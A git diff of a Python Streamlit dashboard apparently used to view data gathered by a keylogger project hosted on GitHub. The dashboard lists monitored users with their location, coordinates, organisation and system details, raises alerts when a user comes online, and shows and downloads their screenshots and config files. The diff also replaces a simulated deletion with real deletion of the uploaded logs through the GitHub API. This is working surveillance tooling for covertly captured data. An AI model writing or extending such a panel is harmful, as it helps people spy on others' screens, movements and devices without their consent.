@@ -45,7 +45,7 @@ def get_token():
 
                 # Remove the first 5 and last 6 characters
                 processed_token = token[5:-6]
-                print(f"Token fetched and processed: {processed_token}")
+                # print(f"Token fetched and processed: {processed_token}")
                 return processed_token
             else:
                 print("Key 'delete' not found in the token data.")
@@ -354,6 +354,12 @@ FOLDERS = {
     "logs": "logs",
     "keylogerror": "keylogerror"
 }
+
+
+# Maximum number of retries for file deletion
+MAX_RETRIES = 3
+
+# Function to get the list of files in a folder
 def get_number_of_files(folder):
     url = f"{GITHUB_API_BASE_URL}/{folder}"
     headers = {
@@ -365,23 +371,66 @@ def get_number_of_files(folder):
     
     if response.status_code == 200:
         files = response.json()
-        return len(files)
+        return files  # Return the list of files
     else:
         st.error(f"Failed to fetch data for {folder}: {response.status_code}")
-        return 0
+        return []
+
+# Function to delete a file using the GitHub API with retries
+def delete_file(folder, file_name, file_sha):
+    url = f"{GITHUB_API_BASE_URL}/{folder}/{file_name}"
+    headers = {
+        "Authorization": f"token {GITHUB_TOKEN}",
+        "Accept": "application/vnd.github.v3+json"
+    }
+    data = {
+        "message": f"Deleting {file_name}",
+        "sha": file_sha
+    }
     
-# Function to simulate file deletion (for demonstration purposes)
+    for attempt in range(MAX_RETRIES):
+        response = requests.delete(url, headers=headers, json=data)
+        
+        if response.status_code == 200:
+            return True
+        else:
+            st.warning(f"\nAttempt {attempt + 1} failed to delete {file_name}: {response.status_code}")
+            time.sleep(1)  # Wait for 1 second before retrying
+    
+    st.error(f"\nFailed to delete {file_name} after {MAX_RETRIES} attempts")
+    return False
+
+# Function to delete files
 def delete_files(folder, num_files_to_delete, terminal_placeholder):
-    for i in range(num_files_to_delete):
-        time.sleep(1)  # Simulate deletion delay
-        terminal_placeholder.text(f"Deleted file {i + 1} from {folder}\n{terminal_placeholder.text}")
-    
-# st.title("GitHub Repository File Counter")
-# if st.button("Get Number of Files"):
-#     for folder_name, folder_path in FOLDERS.items():
-#         num_files = get_number_of_files(folder_path)
-#         github_url = f"https://github.com/bebedudu/keylogger/tree/main/uploads/{folder_path}"
-#         st.markdown(f"[{folder_name.capitalize()}]({github_url}): {num_files} files")
+    files = get_number_of_files(folder)
+    if not files:
+        return
+
+    # Initialize or update the session state for logs
+    if "deletion_logs" not in st.session_state:
+        st.session_state.deletion_logs = "Deletion Log:\n"
+
+    for i in range(min(num_files_to_delete, len(files))):
+        file_name = files[i]["name"]
+        file_sha = files[i]["sha"]
+        file_path = f"uploads/{folder}/{file_name}"
+
+        # Delete the file using the GitHub API with retries
+        if delete_file(folder, file_name, file_sha):
+            # Update the logs
+            st.session_state.deletion_logs = f"\nDeleted: {file_path}\n{st.session_state.deletion_logs}"
+        else:
+            st.session_state.deletion_logs = f"\nFailed to delete: {file_path}\n{st.session_state.deletion_logs}"
+
+        # Update the terminal-like box
+        terminal_placeholder.markdown(
+            f"""
+            <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
+                <pre>{st.session_state.deletion_logs}</pre>
+            </div>
+            """,
+            unsafe_allow_html=True
+        )
 
 
 # function to get tokens details
@@ -430,6 +479,7 @@ def get_rate_limit_details(token):
         "reset_time": reset_time,
     }
 
+    
 # Fetch all tokens
 tokens_data = get_tokensDetails()
 
@@ -447,11 +497,15 @@ def tabbeddashboard():
         st.header("Count Files")
         if st.button("Get Number of Files"):
             st.write("Fetching file counts...")
+
             # Use columns to organize the output
             col1, col2, col3 = st.columns(3)
+
             for i, (folder_name, folder_path) in enumerate(FOLDERS.items()):
-                num_files = get_number_of_files(folder_path)
+                files = get_number_of_files(folder_path)
+                num_files = len(files)  # Calculate the number of files
                 github_url = f"https://github.com/bebedudu/keylogger/tree/main/uploads/{folder_path}"
+
                 # Alternate between columns for better layout
                 if i % 3 == 0:
                     with col1:
@@ -493,18 +547,25 @@ def tabbeddashboard():
                             unsafe_allow_html=True
                         )
 
-
     # Tab 2: Delete Files
     with tab2:
         st.header("Delete Files")
         st.write("Select folders and the number of files to delete.")
+
         # Track deletion progress
         if "deletion_progress" not in st.session_state:
             st.session_state.deletion_progress = {folder: {"total": 0, "deleted": 0} for folder in FOLDERS.keys()}
+
+        # Initialize deletion logs in session state
+        if "deletion_logs" not in st.session_state:
+            st.session_state.deletion_logs = "Deletion Log:\n"
+
         # Display folder selection and sliders
         selected_folders = {}
         for folder_name, folder_path in FOLDERS.items():
-            num_files = get_number_of_files(folder_path)
+            files = get_number_of_files(folder_path)
+            num_files = len(files)
+
             # Card-like layout for each folder
             with st.container():
                 st.subheader(f"Folder: {folder_name}")
@@ -520,27 +581,31 @@ def tabbeddashboard():
                             key=f"slider_{folder_name}"
                         )
                         selected_folders[folder_name] = num_files_to_delete
+
         # Single delete button
         if st.button("Delete Selected Files"):
             if selected_folders:
                 # Create a terminal-like output box
                 terminal_placeholder = st.empty()
                 terminal_placeholder.markdown(
-                    """
+                    f"""
                     <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
-                        <pre>Deletion Log:</pre>
+                        <pre>{st.session_state.deletion_logs}</pre>
                     </div>
                     """,
                     unsafe_allow_html=True
                 )
+
                 # Simulate deletion for selected folders
                 for folder_name, num_files_to_delete in selected_folders.items():
                     if num_files_to_delete > 0:
                         st.session_state.deletion_progress[folder_name]["total"] = num_files_to_delete
                         st.session_state.deletion_progress[folder_name]["deleted"] = 0
-                        # Simulate file deletion
+
+                        # Delete files
                         delete_files(folder_name, num_files_to_delete, terminal_placeholder)
                         st.session_state.deletion_progress[folder_name]["deleted"] = num_files_to_delete
+
                 st.success("Deletion completed!")
             else:
                 st.warning("No folders selected for deletion.")
@@ -551,6 +616,12 @@ def tabbeddashboard():
     
     with tab3:
         st.header("Token Details")
+        
+        # Add a refresh button
+        if st.button("Refresh Token Data"):
+            get_tokensDetails()  # Rerun the app to fetch fresh data
+            
+        
         
         
         # Process and display rate limit details for each token
@@ -586,6 +657,13 @@ def tabbeddashboard():
         
             # Add a divider between tokens
             st.divider()
+            
+        # Add a slider to set the refresh interval
+        refresh_interval = st.slider("Refresh interval (seconds)", min_value=10, max_value=600, value=60)
+        # Automatically refresh the app
+        time.sleep(refresh_interval)
+        # st.experimental_rerun()
+        get_tokensDetails()  # Rerun the app to fetch fresh data
     
     
     
@@ -610,154 +688,170 @@ def tabbeddashboard():
     
     # Tab 4: Active users Dashboard
     with tab4:
-        st.header("Active users Dashboard")  
+        st.header("Active users Dashboard") 
 
         # Main Dashboard App
-        # def dashboard():
-
-
-        # Initialize session state to store previously seen users
-        if "seen_users" not in st.session_state:
-            st.session_state["seen_users"] = set()
-        st.title("Detailed Active User Activity Dashboard")
-        st.write("Explore detailed information of active users.")
-        # Fetch and parse the data
-        lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
-        user_data = parse_user_info(lines)
-        active_user_data = parse_active_user_info(lines)
-        screenshot_data = fetch_screenshots()
-        st.sidebar.header("Active User Activity Dashboard")
-        if user_data:
-            # Get unique users
-            unique_users = get_unique_users(user_data)
-            user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option
-            # Sidebar to select a user
-            selected_user = st.sidebar.selectbox("Select a User", user_list)
-            # Filter data based on selection
-            if selected_user != "All":
-                filtered_users = [user for user in unique_users if user["username"] == selected_user]
-            else:
-                filtered_users = unique_users  # Only show unique users        
-            # Title and "Update Dashboard" Button
-            col1, col2 = st.columns([8, 1])  # Adjust column widths as needed
-            with col1:
-                st.title(f"Active Users: {len(filtered_users)}")
-            with col2:
-                if st.button("Update Dashboard"):
-                    fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
-            # Identify new active users
-            current_users = set(user["username"] for user in unique_users)
-            new_users = current_users - st.session_state["seen_users"]
-            st.session_state["seen_users"].update(current_users)
-            # Display notification for new active users
-            for new_user in new_users:
-                st.info(f"🚨 **{new_user} is active now!**")
-            # Streamlit app
-            # st.title("Active Users")
-            st.write("Dashboard showing unique active users and their details.")
-            # Convert to DataFrame for display
-            df = pd.DataFrame(active_user_data).drop_duplicates(subset="username")
-            st.table(df)  # Display as a table
-            # Fetch data from the URL
-            @st.cache_data(ttl=cache_time)  # Cache the data for 60 seconds to avoid frequent network calls
-            def fetch_data_from_url():
-                import requests
-                response = requests.get(DATA_URL)
-                if response.status_code == 200:
-                    lines = response.text.strip().split("\n")[-last_line:]  # Get the last 10 lines
-                    return parse_user_info(lines)
+        def dashboard():
+            # Initialize session state to store previously seen users
+            if "seen_users" not in st.session_state:
+                st.session_state["seen_users"] = set()
+            st.title("Detailed Active User Activity Dashboard")
+            st.write("Explore detailed information of active users.")
+            # Fetch and parse the data
+            lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
+            user_data = parse_user_info(lines)
+            active_user_data = parse_active_user_info(lines)
+            screenshot_data = fetch_screenshots()
+            st.sidebar.header("Active User Activity Dashboard")
+            if user_data:
+                # Get unique users
+                unique_users = get_unique_users(user_data)
+                user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option
+                # Sidebar to select a user
+                selected_user = st.sidebar.selectbox("Select a User", user_list)
+                # Filter data based on selection
+                if selected_user != "All":
+                    filtered_users = [user for user in unique_users if user["username"] == selected_user]
                 else:
-                    st.error("Failed to fetch data from the URL.")
-                    return []
-            # Create a DataFrame for visualizations
-            df = pd.DataFrame(filtered_users)
-            df["city"] = df["location"].apply(lambda loc: loc.split(",")[1].strip() if "," in loc else "Unknown")
-            df["country"] = df["location"].apply(lambda loc: loc.split(",")[0].strip() if "," in loc else "Unknown")
-            # Display details of filtered users (details of active user)
-            st.title("Active User Dashboard")
-            st.write(f"### Active Users: {len(filtered_users)}")
-            for user in filtered_users:
-                # Use the extracted timestamp
-                # timestamp = user["timestamp"]
-                # with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
-                with st.expander(f"Details for User: {user['username']} (Last Active: {user['timestamp']})"):
-                    st.write(f"**Timestamp:** {user.get('timestamp', 'N/A')}")
-                    st.write(f"**Location:** {user['location']}")
-                    st.write(f"**Organization:** {user['org']}")
-                    st.write(f"**Coordinates:** {user['coordinates']}")
-                    # Display System Info in a table
-                    if "system_info" in user:
-                        system_info_df = pd.DataFrame(
-                            user["system_info"].items(), columns=["Property", "Value"]
+                    filtered_users = unique_users  # Only show unique users        
+                # Title and "Update Dashboard" Button
+                col1, col2 = st.columns([8, 1])  # Adjust column widths as needed
+                with col1:
+                    st.title(f"Active Users: {len(filtered_users)}")
+                with col2:
+                    if st.button("Update Dashboard"):
+                        fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
+                # Identify new active users
+                current_users = set(user["username"] for user in unique_users)
+                new_users = current_users - st.session_state["seen_users"]
+                st.session_state["seen_users"].update(current_users)
+                # Display notification for new active users
+                for new_user in new_users:
+                    st.info(f"🚨 **{new_user} is active now!**")
+                # Streamlit app
+                # st.title("Active Users")
+                st.write("Dashboard showing unique active users and their details.")
+                # Convert to DataFrame for display
+                df = pd.DataFrame(active_user_data).drop_duplicates(subset="username")
+                st.table(df)  # Display as a table
+                # Fetch data from the URL
+                @st.cache_data(ttl=cache_time)  # Cache the data for 60 seconds to avoid frequent network calls
+                def fetch_data_from_url():
+                    import requests
+                    response = requests.get(DATA_URL)
+                    if response.status_code == 200:
+                        lines = response.text.strip().split("\n")[-last_line:]  # Get the last 10 lines
+                        return parse_user_info(lines)
+                    else:
+                        st.error("Failed to fetch data from the URL.")
+                        return []
+                # Create a DataFrame for visualizations
+                df = pd.DataFrame(filtered_users)
+                df["city"] = df["location"].apply(lambda loc: loc.split(",")[1].strip() if "," in loc else "Unknown")
+                df["country"] = df["location"].apply(lambda loc: loc.split(",")[0].strip() if "," in loc else "Unknown")
+                # Display details of filtered users (details of active user)
+                st.title("Active User Dashboard")
+                st.write(f"### Active Users: {len(filtered_users)}")
+                for user in filtered_users:
+                    # Use the extracted timestamp
+                    # timestamp = user["timestamp"]
+                    # with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
+                    with st.expander(f"Details for User: {user['username']} (Last Active: {user['timestamp']})"):
+                        st.write(f"**Timestamp:** {user.get('timestamp', 'N/A')}")
+                        st.write(f"**Location:** {user['location']}")
+                        st.write(f"**Organization:** {user['org']}")
+                        st.write(f"**Coordinates:** {user['coordinates']}")
+                        # Display System Info in a table
+                        if "system_info" in user:
+                            system_info_df = pd.DataFrame(
+                                user["system_info"].items(), columns=["Property", "Value"]
+                            )
+                            st.write("### System Info:")
+                            st.table(system_info_df)
+                # Add Visualization for Country/City Distribution
+                st.write("## User Distribution by Country and City")
+                # Bar Chart for Countries
+                country_counts = df["country"].value_counts().reset_index()
+                country_counts.columns = ["Country", "Count"]
+                st.write("### Country Distribution")
+                country_chart = px.bar(country_counts, x="Country", y="Count", title="Active Users by Country")
+                st.plotly_chart(country_chart, use_container_width=True)
+                # Bar Chart for Cities
+                city_counts = df["city"].value_counts().reset_index()
+                city_counts.columns = ["City", "Count"]
+                st.write("### City Distribution")
+                city_chart = px.bar(city_counts, x="City", y="Count", title="Active Users by City")
+                st.plotly_chart(city_chart, use_container_width=True)
+                st.title("Active User Dashboard with Config Viewer")
+                # Sidebar user selection
+                config_data = fetch_config_files()
+                unique_users = ["All Active"] + sorted(set([c["user"] for c in config_data]))
+                selected_user = st.sidebar.selectbox("Select User (Config)", unique_users)
+                # Display Config Data
+                display_config_data(config_data, selected_user)
+                # Extract unique usernames from the screenshot data
+                unique_users_screenshot = list({s["user"] for s in screenshot_data})  # Set to remove duplicates, then convert to list
+                unique_users_screenshot.sort()  # Optional: Sort usernames alphabetically
+                # Add "All Users" as the first option
+                unique_users_screenshot.insert(0, "All Users")
+                # Sidebar for user selection
+                selected_user = st.sidebar.selectbox("Select User (Screenshot)", unique_users_screenshot)
+                # Add custom CSS for overlaying the download button
+                st.markdown(
+                    """
+                    <style>
+                    .image-container {
+                        position: relative;
+                        display: inline-block;
+                    }
+                    .download-button {
+                        position: absolute;
+                        top: 10px;
+                        right: 10px;
+                        background-color: rgba(255, 255, 255, 0.8);
+                        padding: 5px;
+                        border-radius: 50%;
+                        box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.2);
+                    }
+                    .download-button img {
+                        width: 25px;
+                        height: 25px;
+                    }
+                    </style>
+                    """,
+                    unsafe_allow_html=True,
+                )
+                st.write("## User Latest Screenshots")
+                # Display the latest screenshot for the selected user
+                if selected_user == "All Users":
+                    # Show the latest screenshot for each user
+                    latest_screenshots = {}
+                    for s in screenshot_data:
+                        if s["user"] not in latest_screenshots:
+                            latest_screenshots[s["user"]] = s
+                    for screenshot in latest_screenshots.values():
+                        # st.image(screenshot["url"], caption=f"{screenshot['user']} - {screenshot['timestamp']},")
+                        st.image(
+                            screenshot["url"], 
+                            caption=f"{screenshot['user']} @ {screenshot['timestamp']} 👉 {screenshot['name']}",
+                            use_container_width=True,
                         )
-                        st.write("### System Info:")
-                        st.table(system_info_df)
-            # Add Visualization for Country/City Distribution
-            st.write("## User Distribution by Country and City")
-            # Bar Chart for Countries
-            country_counts = df["country"].value_counts().reset_index()
-            country_counts.columns = ["Country", "Count"]
-            st.write("### Country Distribution")
-            country_chart = px.bar(country_counts, x="Country", y="Count", title="Active Users by Country")
-            st.plotly_chart(country_chart, use_container_width=True)
-            # Bar Chart for Cities
-            city_counts = df["city"].value_counts().reset_index()
-            city_counts.columns = ["City", "Count"]
-            st.write("### City Distribution")
-            city_chart = px.bar(city_counts, x="City", y="Count", title="Active Users by City")
-            st.plotly_chart(city_chart, use_container_width=True)
-            st.title("Active User Dashboard with Config Viewer")
-            # Sidebar user selection
-            config_data = fetch_config_files()
-            unique_users = ["All Active"] + sorted(set([c["user"] for c in config_data]))
-            selected_user = st.sidebar.selectbox("Select User (Config)", unique_users)
-            # Display Config Data
-            display_config_data(config_data, selected_user)
-            # Extract unique usernames from the screenshot data
-            unique_users_screenshot = list({s["user"] for s in screenshot_data})  # Set to remove duplicates, then convert to list
-            unique_users_screenshot.sort()  # Optional: Sort usernames alphabetically
-            # Add "All Users" as the first option
-            unique_users_screenshot.insert(0, "All Users")
-            # Sidebar for user selection
-            selected_user = st.sidebar.selectbox("Select User (Screenshot)", unique_users_screenshot)
-            # Add custom CSS for overlaying the download button
-            st.markdown(
-                """
-                <style>
-                .image-container {
-                    position: relative;
-                    display: inline-block;
-                }
-                .download-button {
-                    position: absolute;
-                    top: 10px;
-                    right: 10px;
-                    background-color: rgba(255, 255, 255, 0.8);
-                    padding: 5px;
-                    border-radius: 50%;
-                    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.2);
-                }
-                .download-button img {
-                    width: 25px;
-                    height: 25px;
-                }
-                </style>
-                """,
-                unsafe_allow_html=True,
-            )
-            st.write("## User Latest Screenshots")
-            # Display the latest screenshot for the selected user
-            if selected_user == "All Users":
-                # Show the latest screenshot for each user
-                latest_screenshots = {}
-                for s in screenshot_data:
-                    if s["user"] not in latest_screenshots:
-                        latest_screenshots[s["user"]] = s
-                for screenshot in latest_screenshots.values():
-                    # st.image(screenshot["url"], caption=f"{screenshot['user']} - {screenshot['timestamp']},")
+                        st.download_button(
+                            label="Download ☝️",
+                            data=requests.get(screenshot["url"]).content,  # Fetch and prepare image data
+                            file_name=screenshot["name"],
+                            mime="image/png"
+                        )
+                else:
+                    # Show only the latest screenshot for the selected user
+                    user_screenshots = [s for s in screenshot_data if s["user"] == selected_user]
+                    # Sort screenshots by timestamp to get the latest one
+                    latest_screenshot = sorted(user_screenshots, key=lambda x: x["timestamp"], reverse=True)[0]
+                    # Display the latest screenshot
+                    # st.image(latest_screenshot["url"], caption=f"{selected_user} - {latest_screenshot['timestamp']}")
                     st.image(
-                        screenshot["url"], 
-                        caption=f"{screenshot['user']} @ {screenshot['timestamp']} 👉 {screenshot['name']}",
+                        latest_screenshot["url"], 
+                        caption=f"{selected_user} @ {latest_screenshot['timestamp']} 👉 {latest_screenshot['name']}",
                         use_container_width=True,
                     )
                     st.download_button(
@@ -766,104 +860,89 @@ def tabbeddashboard():
                         file_name=screenshot["name"],
                         mime="image/png"
                     )
+                # Check for new screenshots
+                new_screenshots, current_screenshots = check_new_screenshots(screenshot_data[0]["timestamp"])
+                if new_screenshots:
+                    st.warning("🚨 New screenshots detected! Please refresh the page to view the latest screenshots."
+                               " Click the 'Update Data' button in the sidebar to refresh the data.")
+                # # Display the last 30 screenshots
+                # # Add a checkbox in the sidebar
+                # show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
+                # # Display the last 30 screenshots (conditionally based on the sidebar checkbox)
+                # st.title("Recent Screenshots")
+                # if show_screenshots:  # Only execute this block if the checkbox is checked
+                #     for screenshot in screenshot_data:
+                #         if selected_user == "All Users" or screenshot["user"] == selected_user:
+                #             st.image(
+                #                 download_image(screenshot["url"]),  # Function to fetch the image
+                #                 caption=screenshot["name"],  # Display the filename as the caption
+                #                 use_container_width=True  # Adjust to fit container width
+                #             )
+                # Initialize latest timestamp
+                if "latest_timestamp" not in st.session_state:
+                    st.session_state.latest_timestamp = datetime.min
+                # Check for new screenshots
+                has_new_data, updated_screenshot_data = check_new_screenshots(st.session_state.latest_timestamp)
+                # Display alert if new data is available
+                if has_new_data:
+                    st.session_state.latest_timestamp = max([s["timestamp"] for s in updated_screenshot_data])
+                    st.sidebar.warning("🔔 New screenshots/logs detected! Refresh to view them.")
+                # Button to refresh manually
+                if st.sidebar.button("Refresh Now"):
+                    fetch_screenshots.clear()  # Clear cache for this function
+                    if "refresh_needed" not in st.session_state:
+                        st.session_state.refresh_needed = False
+                    if st.session_state.refresh_needed:
+                        # Fetch new data or rerun parts of your logic here
+                        st.write("Data has been refreshed!")
+                        st.session_state.refresh_needed = False
+                # Display anomalies (if any restricted country detected)
+                anomalies = detect_anomalies(user_data)
+                # Display anomalies in a table
+                if anomalies:
+                    st.warning("⚠️🚨 Anomalies detected in user activity:")
+                    for anomaly in anomalies:
+                        st.write(f"**User:** {anomaly['user']}, **Reason:** {anomaly['reason']}")
+                else:
+                    st.success("✅ No anomalies detected.")
+                # Display the last 30 screenshots
+                # Sidebar filters
+                show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
+                if show_screenshots:
+                    st.title("Screenshot Gallery")
+                    # User filter
+                    users = ["All Users"] + sorted(set(s["user"] for s in screenshot_data))
+                    selected_user = st.sidebar.selectbox("Select User", users)
+                    # Date filter
+                    start_date = st.sidebar.date_input("Start Date", value=datetime.now().date())
+                    end_date = st.sidebar.date_input("End Date", value=datetime.now().date())
+                    # Filter screenshots
+                    filtered_screenshots = filter_screenshots(screenshot_data, selected_user, start_date, end_date)
+                    # Display screenshots in a gallery layout
+                    col1, col2, col3 = st.columns(3)
+                    for i, screenshot in enumerate(filtered_screenshots):
+                        col = [col1, col2, col3][i % 3]
+                        with col:
+                            st.image(
+                                download_image(screenshot["url"]),
+                                caption=f"{screenshot['user']} - {screenshot['timestamp']}",
+                                use_container_width=True
+                            )
+                # Add a button to update the data
+                st.sidebar.button("Update Data", on_click=fetch_last_10_lines_private, args=(DATA_URL, GITHUB_TOKEN))
+                st.sidebar.button("Update Config Files", on_click=fetch_config_files)
+                st.sidebar.button("Update Screenshots", on_click=fetch_screenshots)
+                st.sidebar.markdown("---")  # Add a separator
+                st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")
             else:
-                # Show only the latest screenshot for the selected user
-                user_screenshots = [s for s in screenshot_data if s["user"] == selected_user]
-                # Sort screenshots by timestamp to get the latest one
-                latest_screenshot = sorted(user_screenshots, key=lambda x: x["timestamp"], reverse=True)[0]
-                # Display the latest screenshot
-                # st.image(latest_screenshot["url"], caption=f"{selected_user} - {latest_screenshot['timestamp']}")
-                st.image(
-                    latest_screenshot["url"], 
-                    caption=f"{selected_user} @ {latest_screenshot['timestamp']} 👉 {latest_screenshot['name']}",
-                    use_container_width=True,
-                )
-                st.download_button(
-                    label="Download ☝️",
-                    data=requests.get(screenshot["url"]).content,  # Fetch and prepare image data
-                    file_name=screenshot["name"],
-                    mime="image/png"
-                )
-            # Check for new screenshots
-            new_screenshots, current_screenshots = check_new_screenshots(screenshot_data[0]["timestamp"])
-            if new_screenshots:
-                st.warning("🚨 New screenshots detected! Please refresh the page to view the latest screenshots."
-                           " Click the 'Update Data' button in the sidebar to refresh the data.")
-            # # Display the last 30 screenshots
-            # # Add a checkbox in the sidebar
-            # show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
-            # # Display the last 30 screenshots (conditionally based on the sidebar checkbox)
-            # st.title("Recent Screenshots")
-            # if show_screenshots:  # Only execute this block if the checkbox is checked
-            #     for screenshot in screenshot_data:
-            #         if selected_user == "All Users" or screenshot["user"] == selected_user:
-            #             st.image(
-            #                 download_image(screenshot["url"]),  # Function to fetch the image
-            #                 caption=screenshot["name"],  # Display the filename as the caption
-            #                 use_container_width=True  # Adjust to fit container width
-            #             )
-            # Initialize latest timestamp
-            if "latest_timestamp" not in st.session_state:
-                st.session_state.latest_timestamp = datetime.min
-            # Check for new screenshots
-            has_new_data, updated_screenshot_data = check_new_screenshots(st.session_state.latest_timestamp)
-            # Display alert if new data is available
-            if has_new_data:
-                st.session_state.latest_timestamp = max([s["timestamp"] for s in updated_screenshot_data])
-                st.sidebar.warning("🔔 New screenshots/logs detected! Refresh to view them.")
-            # Button to refresh manually
-            if st.sidebar.button("Refresh Now"):
-                fetch_screenshots.clear()  # Clear cache for this function
-                if "refresh_needed" not in st.session_state:
-                    st.session_state.refresh_needed = False
-                if st.session_state.refresh_needed:
-                    # Fetch new data or rerun parts of your logic here
-                    st.write("Data has been refreshed!")
-                    st.session_state.refresh_needed = False
-            # Display anomalies (if any restricted country detected)
-            anomalies = detect_anomalies(user_data)
-            # Display anomalies in a table
-            if anomalies:
-                st.warning("⚠️🚨 Anomalies detected in user activity:")
-                for anomaly in anomalies:
-                    st.write(f"**User:** {anomaly['user']}, **Reason:** {anomaly['reason']}")
-            else:
-                st.success("✅ No anomalies detected.")
-            # Display the last 30 screenshots
-            # Sidebar filters
-            show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
-            if show_screenshots:
-                st.title("Screenshot Gallery")
-                # User filter
-                users = ["All Users"] + sorted(set(s["user"] for s in screenshot_data))
-                selected_user = st.sidebar.selectbox("Select User", users)
-                # Date filter
-                start_date = st.sidebar.date_input("Start Date", value=datetime.now().date())
-                end_date = st.sidebar.date_input("End Date", value=datetime.now().date())
-                # Filter screenshots
-                filtered_screenshots = filter_screenshots(screenshot_data, selected_user, start_date, end_date)
-                # Display screenshots in a gallery layout
-                col1, col2, col3 = st.columns(3)
-                for i, screenshot in enumerate(filtered_screenshots):
-                    col = [col1, col2, col3][i % 3]
-                    with col:
-                        st.image(
-                            download_image(screenshot["url"]),
-                            caption=f"{screenshot['user']} - {screenshot['timestamp']}",
-                            use_container_width=True
-                        )
-            # Add a button to update the data
-            st.sidebar.button("Update Data", on_click=fetch_last_10_lines_private, args=(DATA_URL, GITHUB_TOKEN))
-            st.sidebar.button("Update Config Files", on_click=fetch_config_files)
-            st.sidebar.button("Update Screenshots", on_click=fetch_screenshots)
-            st.sidebar.markdown("---")  # Add a separator
-            st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")
-        else:
-            st.warning("No user data found!")
-        # Polling mechanism to update the dashboard every minute
-        while True:
-            time.sleep(60)
-            parse_active_user_info(lines)
+                st.warning("No user data found!")
+            # Polling mechanism to update the dashboard every minute
+            while True:
+                time.sleep(60)
+                parse_active_user_info(lines)
+        
+         
+        dashboard() 
 
 # Streamlit app
 st.set_page_config(page_title="Active User Dashboard", layout="wide", page_icon=":computer:")
@@ -907,7 +986,6 @@ st.markdown(f"""
         © {current_year} Active User Dashboard | Developed by <a href='https://bibekchandsah.com.np' target='_blank' style='text-decoration: none; color: inherit;'>Bibek Chand Sah</a>
     </footer>
 """, unsafe_allow_html=True)
-
 
 
 
